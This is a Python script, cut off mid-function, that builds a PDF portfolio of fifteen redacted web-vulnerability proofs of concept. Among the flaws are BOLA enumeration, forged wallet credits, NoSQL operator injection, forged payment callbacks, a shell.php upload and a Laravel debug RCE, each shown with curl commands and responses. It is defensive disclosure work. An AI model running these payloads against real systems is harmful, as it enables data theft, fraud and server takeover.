#!/usr/bin/env python3
"""
Vulnerability PoC & Exploit Portfolio — Personal Branding Edition
Muhammad Huzaifa Jamil — Cyber Security (SW) Engineer

Design: dark-themed, TLP-inspired severity escalation (Maroon -> Amber -> Gold),
amber-on-black retro-terminal execution logs with block-redacted identifiers.

IMPORTANT — Content notice: every PoC below is a generalized composite drawn
from real, authorized engagement work that has already been remediated by the
respective client. Target names, domains, tokens, record counts, and monetary
figures are fictionalized/rounded — nothing here identifies a specific client,
system, or currently-exploitable target. The document is correctly marked
TLP:CLEAR (unlimited public disclosure) since it contains no client-identifying
or currently-exploitable information — it is NOT marked TLP:AMBER, since that
classification means restricted-disclosure and would be factually wrong to
apply to a public portfolio piece.
"""

import os
import re
import subprocess

OUT = os.path.dirname(os.path.abspath(__file__))
os.makedirs(OUT, exist_ok=True)

OWNER_NAME = "Muhammad Huzaifa Jamil"
OWNER_TITLE = "Cyber Security (SW) Engineer"
OWNER_EMAILS = ["m.huzaifa.jamil@outlook.com", "m.huzaifa.jamil.cys@gmail.com"]


def h(s):
    return (str(s)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;"))


def redact_code(text):
    """HTML-escape a code block, then wrap runs of block-redaction
    characters (█) in a span so they render in the alert colour."""
    escaped = h(text)
    return re.sub(r'(█+)', r'<span class="redact">\1</span>', escaped)


# ── Palette ──────────────────────────────────────────────────────────────────
BG_DARK = "#0A0A0C"
BG_PANEL = "#15151B"
BG_PANEL_2 = "#1B1B22"
BG_CODE = "#050505"
BORDER = "#2A2A34"
BORDER_LIGHT = "#3A3A46"
TEXT = "#E8E6E1"
TEXT_MUTED = "#8A8A96"
TEXT_DIM = "#5E5E68"
TERMINAL_AMBER = "#FFB300"
TERMINAL_AMBER_DIM = "#C98E00"

MAROON = "#B4182F"
MAROON_DIM = "#7A0C2E"
AMBER = "#F0A500"
GOLD = "#C9A227"
SLATE = "#5C7A8A"

SEVERITY_PALETTE = {
    "Critical": {"bg": MAROON, "text": "#FFFFFF", "border": MAROON, "glow": "rgba(180,24,47,0.35)"},
    "High":     {"bg": AMBER,  "text": "#1A1200", "border": AMBER,  "glow": "rgba(240,165,0,0.30)"},
    "Medium":   {"bg": GOLD,   "text": "#1A1500", "border": GOLD,   "glow": "rgba(201,162,39,0.28)"},
    "Low":      {"bg": SLATE,  "text": "#FFFFFF", "border": SLATE,  "glow": "rgba(92,122,138,0.25)"},
}

# ── PoC data ─────────────────────────────────────────────────────────────────
# Each entry: id, title, severity, target_arch, sector, overview, bullets[3], exec_log
POCS = [
    dict(
        id="MHJ-POC-01",
        title="Broken Object-Level Authorization (BOLA) — Mass PII Enumeration",
        severity="Critical",
        target_arch="Microservice (REST API)",
        sector="OTT Platform",
        overview=(
            "A ticketing microservice returns full customer records for any sequential "
            "ticket ID without verifying request-owner match, letting one authenticated "
            "session enumerate every customer's PII platform-wide."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "GET /api/v1/tickets/{ticketId} — ticketId is a sequential integer, not scoped to the requesting session."),
            ("Mechanism of Failure",
             "The service trusts the bearer token's validity alone; it never cross-checks the ticket's owner field against the token's subject claim."),
            ("Potential Business Impact",
             "Sequential enumeration exposes names, national ID numbers, and payment metadata for the platform's entire customer base."),
        ],
        exec_log=(
            "$ for id in 10432 10433 10434; do\n"
            '  curl -s -H "Authorization: Bearer ████████████████████████████" \\\n'
            '    "https://████████████████/api/v1/tickets/$id" | jq \'.customer\'\n'
            "done\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"ticketId": 10432, "customer": {"name": "████████████", "nationalId": "█████-███████-█", "email": "████████████████"}}\n'
            '{"ticketId": 10433, "customer": {"name": "████████████", "nationalId": "█████-███████-█", "email": "████████████████"}}\n'
            '{"ticketId": 10434, "customer": {"name": "████████████", "nationalId": "█████-███████-█", "email": "████████████████"}}\n\n'
            "# sequential iteration over ~1,200 IDs enumerated the full customer table"
        ),
    ),
    dict(
        id="MHJ-POC-02",
        title="Client-Side Hardcoded Cryptographic Key — Transaction Integrity Forgery",
        severity="Critical",
        target_arch="Single-Page Application (Client-Side JS Bundle)",
        sector="OTT Platform",
        overview=(
            "A reward-wallet feature encrypts transaction payloads client-side using an "
            "AES key hardcoded in the JavaScript bundle, letting anyone extract the key "
            "and forge signed transactions."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "The minified app.bundle.js ships a static AES-256 key used to sign the encryptedPayload field of every wallet-credit request."),
            ("Mechanism of Failure",
             "Encryption is meant to prove server trust, but since the same static key both encrypts and validates, any client can forge a valid payload."),
            ("Potential Business Impact",
             "An attacker can mint arbitrary reward-point or wallet-credit transactions, directly inflating balances at the platform's expense."),
        ],
        exec_log=(
            "$ grep -o \"AES_KEY[^,]*\" app.bundle.js\n"
            'AES_KEY = "████████████████████████████████"\n\n'
            "$ python3 forge_payload.py --key ████████████████████████████████ \\\n"
            '    --action "credit" --amount 50000\n'
            "[+] forged payload: ████████████████████████████████████████\n\n"
            '$ curl -i -X POST "https://████████████████/api/v1/wallet/credit" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            '  -d \'{"encryptedPayload": "████████████████████████████████████████"}\'\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"status": "success", "walletBalance": "50000.00", "transactionId": "TXN_████████████"}'
        ),
    ),
    dict(
        id="MHJ-POC-03",
        title="Unverified JWT Client-Side Decode — Business Logic / Score State Manipulation",
        severity="High",
        target_arch="Single-Page Application (WebView / Game Client)",
        sector="OTT Platform",
        overview=(
            "A gamification module decodes a JWT identity token in the browser using a "
            "decode-only library and never verifies its signature server-side before "
            "accepting score submissions."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "POST /score/store accepts a playerId sourced from a client-editable ?token= JWT that the backend never signature-checks."),
            ("Mechanism of Failure",
             "Because verification happens only on the client, editing the token's payload and resubmitting it changes which player record the server updates."),
            ("Potential Business Impact",
             "Any anonymous request can submit forged high scores or reassign in-game achievements to an arbitrary player ID."),
        ],
        exec_log=(
            "$ echo \"████████████████.████████████████.████████████████\" | base64 -d | jq .\n"
            '{"playerId": "████████", "exp": 9999999999}\n\n'
            "$ python3 -c \"import json,base64; print(base64.b64encode(\n"
            "    json.dumps({'playerId':'████████','exp':9999999999}).encode()))\"\n"
            "████████████████████████████\n\n"
            '$ curl -i -X POST "https://████████████████/score/store?token=████████████████.████████████████.████████████████" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            "  -d '{\"score\": 999999999}'\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"status": "accepted", "playerId": "████████", "newScore": 999999999}'
        ),
    ),
    dict(
        id="MHJ-POC-04",
        title="QR-Code Session Fixation — Full Account Takeover",
        severity="Critical",
        target_arch="Cross-Platform Auth Service (Mobile + Smart-TV)",
        sector="OTT Platform",
        overview=(
            "The QR login flow issues a session ID before the code is scanned and never "
            "rotates it after linking, so an attacker's pre-planted QR code hijacks "
            "whichever victim later scans."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "POST /login/qr/generate/session issues a sessionId with no auth and no rate limit before any scan occurs."),
            ("Mechanism of Failure",
             "The same sessionId remains valid and unrotated after a victim's app scans and authenticates it, so the original requester's session inherits the login."),
            ("Potential Business Impact",
             "An attacker displaying a planted QR code, e.g. in a phishing page, gains full session access the moment a victim scans it."),
        ],
        exec_log=(
            '$ curl -s -X POST "https://████████████████/api/v1/login/qr/generate/session" | jq .\n'
            '{"sessionId": "████████████████████████████", "qrPayload": "████████████████████████████"}\n\n'
            "# attacker embeds sessionId in a QR code hosted on a phishing page, waits for a scan\n\n"
            '$ curl -s "https://████████████████/api/v1/login/qr/status/████████████████████████████"\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"status": "linked", "accessToken": "████████████████████████████████████████", "userId": "████████"}'
        ),
    ),
    dict(
        id="MHJ-POC-05",
        title="NoSQL Operator Injection via OTP/Phone Field",
        severity="High",
        target_arch="Microservice (REST API, MongoDB Backend)",
        sector="E-Commerce Platform",
        overview=(
            "The OTP-request endpoint passes the phone field directly into a MongoDB "
            "query, letting query operators like $ne or $regex bypass the intended "
            "exact-match lookup entirely."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             'POST /auth/otp/send accepts phone as a JSON object instead of a string, e.g. {"$ne": null}.'),
            ("Mechanism of Failure",
             "The backend interpolates the raw JSON value into a Mongo find() filter without type-checking, so operators execute instead of matching literally."),
            ("Potential Business Impact",
             "An attacker can match arbitrary or all accounts, trigger OTPs for numbers they don't own, or bypass the phone-verification gate."),
        ],
        exec_log=(
            '$ curl -i -X POST "https://████████████████/auth/otp/send" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            "  -d '{\"phone\": {\"$ne\": null}}'\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"status": "otp_sent", "matchedAccount": "████████████", "phone": "████████████"}\n\n'
            "# operator query matched the first document in the collection instead of a specific user"
        ),
    ),
    dict(
        id="MHJ-POC-06",
        title="Unauthenticated Firebase Realtime DB — Plaintext Credential Disclosure",
        severity="Critical",
        target_arch="Cloud Backend-as-a-Service (Firebase)",
        sector="E-Commerce Platform",
        overview=(
            "A Firebase Realtime Database backing the mobile app ships with default-open "
            "security rules, exposing its full user node — including plaintext password "
            "fields — to any unauthenticated request."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "GET https://<project>.firebaseio.com/users.json — no Authorization header, no App Check enforcement."),
            ("Mechanism of Failure",
             "Realtime Database rules were left at {read: true, write: true}, the SDK default, so any client can dump the entire tree."),
            ("Potential Business Impact",
             "Full account takeover at scale — the dump includes plaintext passwords, phone numbers, and order history for every registered user."),
        ],
        exec_log=(
            '$ curl -s "https://████████████████.firebaseio.com/users.json" | jq \'.[] | {email, password}\'\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"email": "████████████████", "password": "████████████"}\n'
            '{"email": "████████████████", "password": "████████████"}\n'
            '{"email": "████████████████", "password": "████████████"}\n\n'
            "# thousands of records returned in a single unauthenticated request"
        ),
    ),
    dict(
        id="MHJ-POC-07",
        title="Payment Gateway Callback — Missing Signature Verification",
        severity="Critical",
        target_arch="Microservice (Payment Webhook Handler)",
        sector="E-Commerce Platform",
        overview=(
            "Payment-gateway callback endpoints accept order-confirmation webhooks "
            "without validating the gateway's HMAC signature, letting anyone forge a "
            "'payment successful' event for any order ID."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "POST /external/{gateway}/callback processes the signature field but never verifies it against the shared secret."),
            ("Mechanism of Failure",
             "The handler forwards the payload straight to order-fulfillment logic on receipt, treating an unauthenticated POST as gateway-authoritative truth."),
            ("Potential Business Impact",
             "Anyone can mark any unpaid order as paid, releasing goods or services with zero actual payment collected."),
        ],
        exec_log=(
            '$ curl -i -X POST "https://████████████████/external/████████/ipn" \\\n'
            '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
            '  -d "pp_SecureHash=████████████████████████████████&pp_Amount=100000&pp_TxnRefNo=████████████&pp_ResponseCode=000"\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"status": "success", "orderId": "████████████", "paymentConfirmed": true}\n\n'
            "# no HMAC validation performed — order marked paid with zero funds transferred"
        ),
    ),
    dict(
        id="MHJ-POC-08",
        title="IAM Realm/Role Confusion — Privileged JWT Issuance",
        severity="Critical",
        target_arch="Identity & Access Management (Keycloak-style IAM)",
        sector="E-Commerce Platform",
        overview=(
            "Self-registration on a customer-facing signup form silently accepts an "
            "admin-realm parameter, issuing a fully privileged administrative JWT to an "
            "unauthenticated new account."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "POST /auth/realms/admin/register — the IAM realm name is client-suppliable and not restricted to internal callers."),
            ("Mechanism of Failure",
             "The identity provider processes the registration against whichever realm the request names, minting a token scoped to that realm's roles."),
            ("Potential Business Impact",
             "The resulting JWT grants read access to fraud records, financial reversals, and internal admin API surface."),
        ],
        exec_log=(
            '$ curl -i -X POST "https://████████████████/auth/realms/admin/register" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            "  -d '{\"username\": \"████████\", \"password\": \"████████████\", \"email\": \"████████████████\"}'\n\n"
            "HTTP/1.1 201 Created\n"
            "Content-Type: application/json\n\n"
            '{"access_token": "████████████████████████████████████████", "realm": "admin"}\n\n'
            '$ curl -s "https://████████████████/admin/api/v1/fraud-user?status=flagged" \\\n'
            '  -H "Authorization: Bearer ████████████████████████████████████████"\n\n'
            "HTTP/1.1 200 OK\n"
            '{"results": [{"userId": "████████", "phone": "████████████", "flagReason": "████████████"}]}'
        ),
    ),
    dict(
        id="MHJ-POC-09",
        title="Systemic Guest-JWT Authorization Bypass — Internal Business Data Disclosure",
        severity="High",
        target_arch="Mobile Backend-for-Frontend (BFF API Gateway)",
        sector="E-Commerce Platform",
        overview=(
            "A short-lived guest JWT, meant only for browsing, is accepted by eleven "
            "internal endpoints that should require a logged-in session — including "
            "ones returning internal cost and margin data."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "Eleven /api/v2/miniapp/* and /home/* endpoints check only that a JWT is present, not its scope claim."),
            ("Mechanism of Failure",
             "The gateway's auth middleware treats guest and authenticated tokens identically, so a token issued for anonymous browsing satisfies every downstream check."),
            ("Potential Business Impact",
             "Anyone can pull internal cost-price and margin-percentage fields never meant to leave the backend."),
        ],
        exec_log=(
            '$ curl -s -X POST "https://████████████████/auth/guest/token" | jq .\n'
            '{"token": "████████████████████████████████████████", "scope": "guest"}\n\n'
            '$ curl -s "https://████████████████/api/v2/miniapp/product/████████" \\\n'
            '  -H "Authorization: Bearer ████████████████████████████████████████" | jq \'.internal\'\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"costPrice": "████████", "resellerMarginPct": "██%", "internalSku": "████████████"}'
        ),
    ),
    dict(
        id="MHJ-POC-10",
        title="Unauthenticated S3 Pre-Signed URL Generation — Arbitrary File Upload",
        severity="High",
        target_arch="Cloud Storage (S3-Compatible Object Store)",
        sector="E-Commerce Platform",
        overview=(
            "An endpoint mints S3 pre-signed upload URLs for any caller with no "
            "authentication and no file-type restriction, turning the CDN bucket into "
            "an open upload target."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "POST /media/presign-upload returns a valid signed PUT URL regardless of caller identity or requested content-type."),
            ("Mechanism of Failure",
             "The signing service trusts any inbound request as a legitimate content-management action and never checks session, role, or MIME type."),
            ("Potential Business Impact",
             "Anyone can upload arbitrary files — including web shells or malware — directly onto the platform's public CDN."),
        ],
        exec_log=(
            '$ curl -s -X POST "https://████████████████/media/presign-upload" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            '  -d \'{"filename": "shell.php", "contentType": "application/x-php"}\'\n\n'
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"uploadUrl": "https://████████████████.s3.amazonaws.com/████████████████████████?X-Amz-Signature=████████████████████████████████"}\n\n'
            '$ curl -i -X PUT "████████████████████████████████████████" --data-binary @shell.php\n\n'
            "HTTP/1.1 200 OK\n"
            'ETag: "████████████████████████████"'
        ),
    ),
    dict(
        id="MHJ-POC-11",
        title="CORS Misconfiguration (Reflected Origin + Credentials) — Cross-Origin Session Hijack",
        severity="High",
        target_arch="Microservice (Video/DRM Metadata API)",
        sector="OTT Platform",
        overview=(
            "A video-metadata API reflects any Origin header back in "
            "Access-Control-Allow-Origin while also setting Allow-Credentials: true, "
            "letting any malicious site read a victim's authenticated responses."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "GET /api/video/{id}/drm-token reflects the request's Origin header verbatim instead of checking an allowlist."),
            ("Mechanism of Failure",
             "Combining a reflected wildcard-style origin with Allow-Credentials: true lets a cross-origin page fetch the response using the victim's own cookies."),
            ("Potential Business Impact",
             "A malicious webpage can silently harvest a logged-in visitor's DRM tokens or session data cross-origin."),
        ],
        exec_log=(
            '$ curl -i "https://████████████████/api/video/████████/drm-token" \\\n'
            '  -H "Origin: https://████████████████.attacker-controlled" \\\n'
            '  -H "Cookie: session=████████████████████████████"\n\n'
            "HTTP/1.1 200 OK\n"
            "Access-Control-Allow-Origin: https://████████████████.attacker-controlled\n"
            "Access-Control-Allow-Credentials: true\n"
            "Content-Type: application/json\n\n"
            '{"drmToken": "████████████████████████████████████████"}'
        ),
    ),
    dict(
        id="MHJ-POC-12",
        title="Business Logic Flaw — Unbounded Negative-Value Integer Manipulation",
        severity="Medium",
        target_arch="Microservice (Subscription/Rewards Ledger)",
        sector="OTT Platform",
        overview=(
            "A subscriber-count / rewards-ledger endpoint accepts negative integers in "
            "a decrement parameter with no floor check, allowing the stored counter to "
            "go negative and corrupt downstream reporting."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "PATCH /channel/{id}/subscribers accepts a signed integer delta with no lower-bound validation server-side."),
            ("Mechanism of Failure",
             "The service applies the delta directly to a stored counter without clamping at zero, so repeated negative deltas drive it below zero."),
            ("Potential Business Impact",
             "Negative subscriber counts corrupt analytics dashboards and any revenue-share or payout logic keyed to that counter."),
        ],
        exec_log=(
            '$ curl -i -X PATCH "https://████████████████/channel/████████/subscribers" \\\n'
            '  -H "Authorization: Bearer ████████████████████████████" \\\n'
            "  -d '{\"delta\": -999999999}'\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            '{"channelId": "████████", "subscriberCount": -999999236}'
        ),
    ),
    dict(
        id="MHJ-POC-13",
        title="Broken Function-Level Authorization (BFLA) — Unauthorized Administrative Write Access",
        severity="High",
        target_arch="Monolith (Content Management Portal)",
        sector="OTT Platform",
        overview=(
            "A content-portal API checks only that a JWT is valid, not the role it "
            "carries, letting a standard user account call admin-only write endpoints "
            "that edit or delete live events."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "PUT/DELETE /portal/events/{id} and /portal/ticket-types/{id} accept any authenticated JWT regardless of role claim."),
            ("Mechanism of Failure",
             "The portal's route middleware verifies token signature and expiry but never checks the role/permission claim before dispatching to admin handlers."),
            ("Potential Business Impact",
             "A standard staff or vendor account can edit pricing, delete live events, or alter ticket types platform-wide."),
        ],
        exec_log=(
            '$ curl -i -X DELETE "https://████████████████/portal/events/████████" \\\n'
            '  -H "Authorization: Bearer ████████████████████████████"\n\n'
            "HTTP/1.1 204 No Content\n\n"
            "# token belongs to a standard vendor-tier account — role claim never checked server-side"
        ),
    ),
    dict(
        id="MHJ-POC-14",
        title="Debug Mode Enabled in Production — Remote Code Execution Preconditions",
        severity="Critical",
        target_arch="Monolith (PHP/Laravel Web Application)",
        sector="NGO / Non-Profit Platform",
        overview=(
            "A development-tagged host runs a production Laravel deployment with debug "
            "mode enabled, exposing the framework's debug page and satisfying every "
            "precondition for its known unauthenticated RCE chain."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "Any invalid request path renders the framework's debug error page, revealing the version and a live 'Execute Code' debug action."),
            ("Mechanism of Failure",
             "With debug mode left enabled in the environment config, the debug page's solution-runner feature accepts attacker-supplied PHP for execution — a documented unauthenticated RCE chain."),
            ("Potential Business Impact",
             "An unauthenticated visitor can achieve remote code execution on the host, a direct path to full server compromise."),
        ],
        exec_log=(
            '$ curl -s "https://████████████████/nonexistent-route"\n\n'
            "HTTP/1.1 500 Internal Server Error\n"
            "X-Powered-By: PHP/████████\n\n"
            "<!-- framework debug page rendered -->\n"
            "<title>Error - ████████████████</title>\n"
            "...\n"
            '"solutions": [{"run_button": true, "action_url": "/_debug/execute-solution"}]\n\n'
            '$ curl -i -X POST "https://████████████████/_debug/execute-solution" \\\n'
            '  -H "Content-Type: application/json" \\\n'
            '  -d \'{"solution": "████████████████████████████", "parameters": {"variableName": "████████"}}\'\n\n'
            "HTTP/1.1 200 OK\n"
            '{"message": "Solution executed successfully."}'
        ),
    ),
    dict(
        id="MHJ-POC-15",
        title="Unauthenticated Observability Endpoint — Infrastructure & Internal Topology Disclosure",
        severity="Medium",
        target_arch="Cloud-Native Microservices (Kubernetes)",
        sector="Cross-Sector Infrastructure",
        overview=(
            "An internal observability dashboard is reachable from the public internet "
            "with no authentication, streaming live request traces that reveal every "
            "backend microservice's hostname and internal API structure."
        ),
        bullets=[
            ("The Vulnerable Parameter/Endpoint",
             "GET /api/live-traces on the observability platform's public hostname requires no session or API key."),
            ("Mechanism of Failure",
             "The tracing dashboard was deployed with its default open-access configuration, intended only for an internal VPN-restricted network."),
            ("Potential Business Impact",
             "Live traces map the full internal microservice topology, arming an attacker with a ready-made target list for follow-on attacks."),
        ],
        exec_log=(
            "$ curl -s \"https://████████████████/api/live-traces\" | jq '.traces[0]'\n\n"
            "HTTP/1.1 200 OK\n"
            "Content-Type: application/json\n\n"
            "{\n"
            '  "service": "████████████-service",\n'
            '  "endpoint": "POST /internal/v2/████████",\n'
            '  "upstream": "████████████.svc.cluster.local:████",\n'
            '  "durationMs": 42\n'
            "}\n\n"
            "# response enumerates every backend microservice hostname and internal route"
        ),
    ),
]


def word_count_check():
    warnings = []
    for p in POCS:
        ov_words = len(p["overview"].split())
        if ov_words > 30:
            warnings.append(f'{p["id"]} overview: {ov_words} words (>30)')
        bullet_words = sum(len(b[1].split()) for b in p["bullets"])
        if bullet_words > 70:
            warnings.append(f'{p["id"]} technical analysis: {bullet_words} words (>70)')
    return warnings


CSS = f"""
*, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}

@page {{
  size: A4;
  margin: 18mm 16mm 20mm 16mm;
  background: {BG_DARK};
  @bottom-left {{
    content: "{h(OWNER_NAME.upper())} — VULNERABILITY POC & EXPLOIT PORTFOLIO";
    font-family: 'Courier New', Consolas, monospace;
    font-size: 6pt;
    color: {TEXT_DIM};
    letter-spacing: 0.06em;
  }}
  @bottom-right {{
    content: counter(page);
    font-family: 'Courier New', Consolas, monospace;
    font-size: 7pt;
    color: {TEXT_DIM};
  }}
}}
@page :first {{ margin: 0; @bottom-left {{ content: none; }} @bottom-right {{ content: none; }} }}

html, body {{
  background: {BG_DARK};
  color: {TEXT};
  font-family: -apple-system, 'Segoe UI', Arial, Helvetica, sans-serif;
  font-size: 9pt;
  line-height: 1.6;
}}

p {{ margin-bottom: 3mm; }}
strong {{ font-weight: 700; color: #FFFFFF; }}

/* ── Cover ──────────────────────────────────────────────────────────────── */
.cover {{
  width: 210mm;
  height: 297mm;
  background: {BG_DARK};
  position: relative;
  break-after: page;
  overflow: hidden;
}}
.cover-glow {{
  position: absolute;
  top: -60mm; right: -60mm;
  width: 160mm; height: 160mm;
  border-radius: 50%;
  background: radial-gradient(circle, {MAROON_DIM} 0%, rgba(122,12,46,0) 70%);
  opacity: 0.55;
}}
.cover-inner {{ position: relative; padding: 20mm 18mm; }}
.tlp-marking {{
  display: inline-block;
  font-family: 'Courier New', Consolas, monospace;
  font-size: 8pt;
  font-weight: bold;
  letter-spacing: 0.15em;
  color: #FFFFFF;
  background: {AMBER};
  padding: 2mm 5mm;
  border-radius: 1pt;
  margin-bottom: 14mm;
}}
.cover-kicker {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 8pt;
  letter-spacing: 0.2em;
  text-transform: uppercase;
  color: {TERMINAL_AMBER};
  margin-bottom: 6mm;
}}
.cover-title {{
  font-size: 30pt;
  font-weight: 800;
  line-height: 1.15;
  color: #FFFFFF;
  margin-bottom: 6mm;
  max-width: 150mm;
}}
.cover-title .accent {{ color: {AMBER}; }}
.cover-subtitle {{
  font-size: 10.5pt;
  color: {TEXT_MUTED};
  max-width: 140mm;
  line-height: 1.7;
  margin-bottom: 12mm;
}}
.cover-rule {{ width: 40mm; height: 1.2mm; background: {MAROON}; margin-bottom: 10mm; }}

.cover-stats-row {{ display: table; width: 100%; margin-bottom: 10mm; border-spacing: 0; }}
.cover-stats-row .stat-cell {{
  display: table-cell;
  width: 20%;
  padding-right: 3mm;
}}
.cover-stat-box {{
  border: 0.8pt solid {BORDER_LIGHT};
  background: {BG_PANEL};
  border-radius: 2pt;
  padding: 4mm 3mm;
  text-align: center;
}}
.cover-stat-num {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 20pt;
  font-weight: bold;
  line-height: 1;
}}
.cover-stat-label {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 6pt;
  color: {TEXT_MUTED};
  text-transform: uppercase;
  letter-spacing: 0.08em;
  margin-top: 1.5mm;
}}

.cover-meta-table {{ width: 100%; border-collapse: collapse; margin-bottom: 8mm; }}
.cover-meta-table td {{ padding: 2mm 0; border-bottom: 0.5pt solid {BORDER}; vertical-align: top; }}
.cover-meta-table td.mk {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 7pt;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: {TEXT_DIM};
  width: 42mm;
  white-space: nowrap;
}}
.cover-meta-table td.mv {{ font-size: 9.5pt; color: {TEXT}; }}

.cover-notice {{
  background: {BG_PANEL};
  border-left: 3pt solid {AMBER};
  border-radius: 0 2pt 2pt 0;
  padding: 4mm 5mm;
  font-size: 8pt;
  color: {TEXT_MUTED};
  line-height: 1.6;
}}
.cover-notice strong {{ color: {TERMINAL_AMBER}; }}

/* ── Section headers ──────────────────────────────────────────────────────── */
.section {{ margin-bottom: 8mm; }}
.section-title {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 8pt;
  letter-spacing: 0.15em;
  text-transform: uppercase;
  color: {TEXT_MUTED};
  padding-bottom: 2mm;
  margin-bottom: 5mm;
  border-bottom: 1.2pt solid {AMBER};
}}
.pb {{ break-before: page; }}

/* ── PoC card ─────────────────────────────────────────────────────────────── */
.poc-card {{
  background: {BG_PANEL};
  border: 0.8pt solid {BORDER_LIGHT};
  border-radius: 2pt;
  padding: 6mm 6mm 5mm;
  margin-bottom: 8mm;
  break-inside: avoid;
}}
.poc-header {{ margin-bottom: 4mm; }}
.poc-id {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 7.5pt;
  letter-spacing: 0.1em;
  color: {TERMINAL_AMBER};
  margin-bottom: 1.5mm;
}}
.poc-title {{
  font-size: 13.5pt;
  font-weight: 700;
  color: #FFFFFF;
  line-height: 1.35;
  margin-bottom: 3mm;
}}
.poc-badges-table {{ width: 100%; border-collapse: collapse; margin-bottom: 2mm; }}
.poc-badges-table td {{ padding: 0 1.5mm 0 0; vertical-align: middle; }}
.badge {{
  display: inline-block;
  font-family: 'Courier New', Consolas, monospace;
  font-size: 6.5pt;
  font-weight: bold;
  letter-spacing: 0.05em;
  text-transform: uppercase;
  padding: 1.3mm 2.5mm;
  border-radius: 1.5pt;
  white-space: nowrap;
}}
.badge-outline {{
  background: transparent;
  border: 0.7pt solid {BORDER_LIGHT};
  color: {TEXT_MUTED};
}}

.poc-body-title {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 7pt;
  letter-spacing: 0.12em;
  text-transform: uppercase;
  color: {AMBER};
  font-weight: bold;
  margin: 4mm 0 2mm;
}}
.poc-overview {{ font-size: 9.3pt; color: {TEXT}; line-height: 1.65; margin-bottom: 1mm; }}

ul.tech-list {{ margin: 0; padding: 0; list-style: none; }}
ul.tech-list li {{
  font-size: 8.6pt;
  color: {TEXT};
  line-height: 1.6;
  margin-bottom: 2mm;
  padding-left: 4mm;
  border-left: 2pt solid {BORDER_LIGHT};
}}
ul.tech-list li strong {{ color: {TERMINAL_AMBER}; font-weight: 700; }}

.exec-log {{
  background: {BG_CODE};
  border: 0.7pt solid {BORDER_LIGHT};
  border-radius: 1.5pt;
  padding: 4mm 5mm;
  margin-top: 2mm;
  font-family: 'Courier New', Consolas, monospace;
  font-size: 7.3pt;
  line-height: 1.55;
  color: {TERMINAL_AMBER_DIM};
  white-space: pre-wrap;
  word-break: break-all;
}}
.exec-log .redact {{
  color: {MAROON};
  background: rgba(180,24,47,0.18);
  border-radius: 1pt;
}}
.exec-log-label {{
  font-family: 'Courier New', Consolas, monospace;
  font-size: 6.3pt;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: {TEXT_DIM};
  margin-top: 2mm;
  margin-bottom: 1mm;
}}
"""


def severity_badge(sev):
    p = SEVERITY_PALETTE[sev]
    return (f'<span class="badge" style="background:{p["bg"]};color:{p["text"]};">'
            f'{h(sev)} Severity</span>')


def outline_badge(label):
    return f'<span class="badge badge-outline">{h(label)}</span>'


def make_poc_card(poc):
    bullets_html = "".join(
        f'<li><strong>{h(label)}:</strong> {h(text)}</li>'
        for label, text in poc["bullets"]
    )
    sev = poc["severity"]
    glow = SEVERITY_PALETTE[sev]["border"]
    return f'''
<div class="poc-card" style="border-left: 3pt solid {glow};">
  <div class="poc-header">
    <div class="poc-id">{h(poc["id"])}</div>
    <div class="poc-title">{h(poc["title"])}</div>
    <table class="poc-badges-table"><tr>
      <td>{severity_badge(sev)}</td>
      <td>{outline_badge(poc["target_arch"])}</td>
      <td>{outline_badge(poc["sector"])}</td>
    </tr></table>
  </div>

  <div class="poc-body-title">1. Vulnerability Overview</div>
  <div class="poc-overview">{h(poc["overview"])}</div>

  <div class="poc-body-title">2. Technical Analysis &amp; Threat Vector</div>
  <ul class="tech-list">{bullets_html}</ul>

  <div class="poc-body-title">3. Exploit PoC &amp; Execution Log</div>
  <div class="exec-log-label">$ terminal — identifiers block-redacted</div>
  <div class="exec-log">{redact_code(poc["exec_log"])}</div>
</div>'''


def make_cover(total, sev_counts):
    emails_line = " &middot; ".join(OWNER_EMAILS)
    stat_order = ["Critical", "High", "Medium", "Low"]
    stat_cells = "".join(
        f'''<td class="stat-cell">
